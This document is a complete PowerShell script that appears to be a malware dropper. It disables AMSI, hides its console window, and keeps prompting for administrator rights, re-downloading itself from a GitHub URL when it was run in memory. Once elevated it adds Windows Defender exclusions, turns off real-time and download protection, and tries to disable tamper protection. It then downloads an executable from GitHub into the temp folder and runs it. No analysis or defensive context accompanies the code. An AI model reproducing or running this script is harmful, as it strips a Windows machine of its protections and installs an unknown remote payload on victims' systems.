# ===== AMSI KILL (safe, wrapped) =====
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

# ===== HIDE WINDOW =====
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # launched from disk -> self path; launched from iex -> re-download from URL
    $self = "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1"
    $target = if ($PSCommandPath) { "-File `"$PSCommandPath`"" } else { "-c iex((New-Object Net.WebClient).DownloadString('$self'))" }

    while ($true) {
        try {
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $target" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ===== ELEVATED: EXCLUSIONS =====
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP\helloworldd.exe" -ErrorAction SilentlyContinue

# ===== ELEVATED: BEST EFFORT KILL =====
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue

# ===== DOWNLOAD + RUN =====
$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe"
$out = Join-Path $env:TEMP "helloworldd.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
